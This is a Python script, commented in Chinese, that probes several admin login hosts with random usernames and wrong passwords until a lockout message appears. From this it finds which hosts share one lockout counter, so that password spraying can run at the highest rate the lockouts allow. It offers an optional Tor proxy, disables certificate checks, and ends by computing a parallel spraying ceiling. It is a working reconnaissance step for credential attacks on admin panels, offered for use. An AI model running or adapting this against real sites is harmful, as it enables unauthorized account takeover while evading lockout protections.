#!/usr/bin/env python3
"""多实例账号锁等价判定矩阵（先判独立实例数, 再决定并行投入）。

原理: 账号锁计数可能 per-(实例,账号), 也可能全站/多域名共享于同一后端。
方法: 对未归类域名逐个当基准——全新探测名在基准上连打到「已锁定」,
      再对其它未归类域名各读 1 发: 回锁定 = 与基准同后端(不增预算),
      回错误凭据 = 独立实例。循环直到全部归类。

必须先判后喷: 对共享后端的域名重复投入 = 白白互偷同一份 5发/15min 预算。

注意事项:
  * 锁约 15 分钟过期——同一批判定必须在一个窗口内跑完, 跨窗口旧读数变
    「未锁」→ 假独立。
  * 每个等价类用一个全新探测名; 探测名不要用真词(不进正式词典, 不污染预算)。
  * 部分实例阈值漂移(5-7 发才锁): 打到「第 6-8 发回锁定」为准, 别只打 5 发。
  * 文案按站改 LOCK_MSG / WRONG_MSG 两个子串即可; 有验证码字段则单发必失败
    (先确认凭据校验层可达再跑本脚本)。

用法: 改下方配置 → python3 cross_lock_matrix.py
"""
import random
import string
import time

import requests
import urllib3

urllib3.disable_warnings()
# ==== 按目标修改 ====
LOGIN_PATH = "/admin/index/doLogin"           # 登录提交路径
FIELD_USER = "username"                        # 用户名表单字段
FIELD_PASS = "password"                        # 密码表单字段
HOSTS = [                                      # 全部候补域名/实例
    "https://api002.example.com",
    "https://api.example.com",
    "https://admin1.example.com",
]
LOCK_MSG = "已被临时锁定"                       # 锁定文案子串
WRONG_MSG = "用户名或密码错误"                   # 错误凭据文案子串
MAX_THROWS = 8                                 # 最多打这么多发找锁定
PROXY = None                                   # 需要时 {"https": "socks5h://127.0.0.1:9050"}
# ====================


def probe_name():
    return "zzprobe_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))


def hit(base, user, password="x1x1x1"):
    s = requests.Session()
    s.verify = False
    if PROXY:
        s.proxies = PROXY
    try:
        r = s.post(base + LOGIN_PATH, data={FIELD_USER: user, FIELD_PASS: password}, timeout=25)
        return r.text[:400]
    except Exception as e:  # noqa: BLE001
        return f"EXC {e}"


def main():
    unresolved = list(HOSTS)
    classes = []
    while len(unresolved) > 1:
        base = unresolved[0]
        name = probe_name()
        locked = False
        for n in range(1, MAX_THROWS + 1):
            msg = hit(base, name)
            if LOCK_MSG in msg:
                locked = True
                print(f"[基准] {base} 探测名 {name} 第 {n} 发锁定")
                break
            time.sleep(0.3)
        if not locked:
            print(f"[!!] {base} 打 {MAX_THROWS} 发未锁——链路/阈值异常, 中止")
            return
        same = []
        for h in unresolved[1:]:
            msg = hit(h, name)
            if LOCK_MSG in msg:
                same.append(h)
            time.sleep(0.2)
        klass = [base] + same
        classes.append(klass)
        print(f"[等价类 {len(classes)}] " + " | ".join(klass))
        unresolved = [h for h in unresolved if h not in klass]
    if unresolved:
        classes.append(unresolved)
        print(f"[等价类 {len(classes)}] " + " | ".join(unresolved))
    print(f"\n共 {len(classes)} 个独立实例 → 并行天花板 ≈ 实例数 × 用户名数 × 5 ÷ 15.5min")


if __name__ == "__main__":
    main()
